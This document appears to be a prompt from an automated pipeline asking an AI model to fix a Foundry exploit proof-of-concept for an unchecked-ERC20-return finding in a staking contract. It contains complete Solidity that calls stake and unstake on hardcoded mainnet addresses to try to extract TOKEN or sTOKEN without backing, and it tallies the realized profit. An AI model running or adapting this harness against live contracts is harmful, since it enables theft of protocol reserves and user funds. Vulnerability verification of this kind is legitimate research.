You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked ERC20 return values let stake and unstake proceed even when token transfers silently fail
- claim: `stake()` and `unstake()` invoke `TOKEN.transferFrom`, `sTOKEN.transfer`, `sTOKEN.transferFrom`, and `TOKEN.transfer` without checking their boolean return values. If either configured token signals failure by returning `false` instead of reverting, the function continues as though the transfer succeeded.
- impact: Silent transfer failures can break the 1:1 backing invariant. A caller can be credited sTOKEN without depositing TOKEN, or withdraw TOKEN without actually surrendering sTOKEN, creating direct reserve theft or user fund loss depending on which transfer silently fails.
- exploit_paths: ["Call `stake(_to, amount)` with a TOKEN implementation that returns `false` from `transferFrom`; the function still executes `sTOKEN.transfer(_to, amount)` and credits the user without receiving backing TOKEN.", "Call `unstake(_to, amount, false)` with an sTOKEN implementation that returns `false` from `transferFrom`; the function still reaches `TOKEN.transfer(_to, amount)` and pays out without actually taking in the receipt tokens.", "Call `unstake(_to, amount, false)` where `TOKEN.transfer` returns `false`; the user has already transferred in sTOKEN, but receives no TOKEN while the transaction itself does not revert."]

Current FlawVerifier.sol:
```solidity
pragma solidity 0.8.19;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IStakingTarget {
    function TOKEN() external view returns (address);
    function sTOKEN() external view returns (address);
    function stake(address _to, uint256 _amount) external;
    function unstake(address _to, uint256 _amount, bool _rebase) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x05999eB831ae28Ca920cE645A5164fbdB1D74Fe9;
    // Decoded from the verified Staking constructor arguments in the local Etherscan cache.
    address public constant TOKEN = 0x39D8bCb39DE75218E3C08200D95Fde3A479D7A14;
    address public constant STOKEN = 0xDd28C9D511A77835505d2fBe0C9779Ed39733bde;
    // On-chain verified source for TOKEN at 0x39D8... is OZ-style ERC20:
    // transfer() -> _transfer(...) -> return true
    // transferFrom() -> _transfer(...) + require(allowance >= amount) -> return true
    // _transfer() reverts on insufficient balance.
    //
    // On-chain verified source for sTOKEN at 0xDd28... is also OZ-style ERC20:
    // transfer() -> _transfer(...) -> return true
    // transferFrom() -> _spendAllowance(...) + _transfer(...) -> return true
    // _spendAllowance() and _transfer() both revert on failure.
    //
    // Therefore the finding's silent-false precondition is expected to be mechanically
    // unreachable at the configured mainnet fork unless the deployed bytecode diverges
    // from the verified source.

    enum PathResult {
        Unattempted,
        Success,
        Reverted,
        NoEffect,
        MissingVerifierBalance
    }

    address private _profitToken;
    uint256 private _profitAmount;
    bool public executed;
    bool public hypothesisValidated;
    uint8 public exploitPathUsed;

    PathResult public stakePathResult;
    PathResult public unstakeWithoutSTokenResult;
    PathResult public unstakeTokenTransferFalseProbeResult;

    constructor() {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        uint256 tokenBefore = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenBefore = IERC20Like(STOKEN).balanceOf(address(this));

        _attemptDirectUnstakeWithoutSToken(tokenBefore, sTokenBefore);

        if (_profitAmount == 0) {
            _attemptFreeStakeThenRedeem(tokenBefore, sTokenBefore);
        }

        if (_profitAmount == 0) {
            _attemptVictimLossProbe();
        }

        _refreshProfit(tokenBefore, sTokenBefore);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptDirectUnstakeWithoutSToken(
        uint256 tokenBefore,
        uint256 sTokenBefore
    ) internal {
        if (_profitAmount != 0) {
            return;
        }

        uint256 reserve = IERC20Like(TOKEN).balanceOf(TARGET);
        if (reserve == 0) {
            unstakeWithoutSTokenResult = PathResult.NoEffect;
            return;
        }

        uint256 amount = _boundAmount(reserve);
        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IStakingTarget.unstake.selector,
                address(this),
                amount,
                false
            )
        );

        if (!ok) {
            unstakeWithoutSTokenResult = PathResult.Reverted;
            return;
        }

        uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));

        if (tokenAfter > tokenBefore && sTokenAfter == sTokenBefore) {
            unstakeWithoutSTokenResult = PathResult.Success;
            hypothesisValidated = true;
            exploitPathUsed = 2;
            _profitToken = TOKEN;
            _profitAmount = tokenAfter - tokenBefore;
            return;
        }

        unstakeWithoutSTokenResult = PathResult.NoEffect;
    }

    function _attemptFreeStakeThenRedeem(
        uint256 tokenBefore,
        uint256 sTokenBefore
    ) internal {
        uint256 stakingSTokenBalance = IERC20Like(STOKEN).balanceOf(TARGET);
        if (stakingSTokenBalance == 0) {
            stakePathResult = PathResult.NoEffect;
            return;
        }

        _approveMaxIfNeeded(TOKEN, TARGET);

        uint256 amount = _boundAmount(stakingSTokenBalance);
        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IStakingTarget.stake.selector,
                address(this),
                amount
            )
        );

        if (!ok) {
            stakePathResult = PathResult.Reverted;
            return;
        }

        uint256 tokenAfterStake = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenAfterStake = IERC20Like(STOKEN).balanceOf(address(this));

        if (sTokenAfterStake <= sTokenBefore || tokenAfterStake < tokenBefore) {
            stakePathResult = PathResult.NoEffect;
            return;
        }

        stakePathResult = PathResult.Success;
        hypothesisValidated = true;
        exploitPathUsed = 1;

        uint256 minted = sTokenAfterStake - sTokenBefore;
        _approveMaxIfNeeded(STOKEN, TARGET);

        (ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IStakingTarget.unstake.selector,
                address(this),
                minted,
                false
            )
        );

        if (ok) {
            uint256 tokenAfterRedeem = IERC20Like(TOKEN).balanceOf(address(this));
            if (tokenAfterRedeem > tokenBefore) {
                _profitToken = TOKEN;
                _profitAmount = tokenAfterRedeem - tokenBefore;
                return;
            }
        }

        uint256 sTokenAfterRedeem = IERC20Like(STOKEN).balanceOf(address(this));
        if (sTokenAfterRedeem > sTokenBefore) {
            _profitToken = STOKEN;
            _profitAmount = sTokenAfterRedeem - sTokenBefore;
        }
    }

    function _attemptVictimLossProbe() internal {
        if (IERC20Like(STOKEN).balanceOf(address(this)) == 0) {
            // Path 3 is a user-loss path, not a profit path. Without verifier-held sTOKEN,
            // probing it would require unrelated setup capital and would change the allowed route.
            unstakeTokenTransferFalseProbeResult = PathResult.MissingVerifierBalance;
            return;
        }

        _approveMaxIfNeeded(STOKEN, TARGET);

        uint256 tokenBefore = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenBefore = IERC20Like(STOKEN).balanceOf(address(this));
        uint256 reserve = IERC20Like(TOKEN).balanceOf(TARGET);
        if (reserve == 0) {
            unstakeTokenTransferFalseProbeResult = PathResult.NoEffect;
            return;
        }

        uint256 amount = _min(1, _min(sTokenBefore, reserve));
        (bool ok, ) = TARGET.call(
            abi.encodeWithSelector(
                IStakingTarget.unstake.selector,
                address(this),
                amount,
                false
            )
        );

        if (!ok) {
            unstakeTokenTransferFalseProbeResult = PathResult.Reverted;
            return;
        }

        uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));

        if (sTokenAfter < sTokenBefore && tokenAfter == tokenBefore) {
            unstakeTokenTransferFalseProbeResult = PathResult.Success;
            hypothesisValidated = true;
            if (exploitPathUsed == 0) {
                exploitPathUsed = 3;
            }
            return;
        }

        unstakeTokenTransferFalseProbeResult = PathResult.NoEffect;
    }

    function _refreshProfit(uint256 tokenBefore, uint256 sTokenBefore) internal {
        if (_profitAmount != 0) {
            return;
        }

        uint256 tokenAfter = IERC20Like(TOKEN).balanceOf(address(this));
        uint256 sTokenAfter = IERC20Like(STOKEN).balanceOf(address(this));

        if (tokenAfter > tokenBefore) {
            _profitToken = TOKEN;
            _profitAmount = tokenAfter - tokenBefore;
            return;
        }

        if (sTokenAfter > sTokenBefore) {
            _profitToken = STOKEN;
            _profitAmount = sTokenAfter - sTokenBefore;
        }
    }

    function _approveMaxIfNeeded(address asset, address spender) internal {
        if (IERC20Like(asset).allowance(address(this), spender) != type(uint256).max) {
            (bool ok, bytes memory data) = asset.call(
                abi.encodeWithSelector(IERC20Like.approve.selector, spender, type(uint256).max)
            );
            require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
        }
    }

    function _boundAmount(uint256 maxAvailable) internal pure returns (uint256) {
        if (maxAvailable == 0) {
            return 0;
        }
        return 1;
    }

    function _min(uint256 a, uint256 b) internal pure returns (uint256) {
        return a < b ? a : b;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: stake(_to, amount), stoken.transfer(_to, amount), unstake(_to, amount, false), token.transfer(_to, amount), token.transfer
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
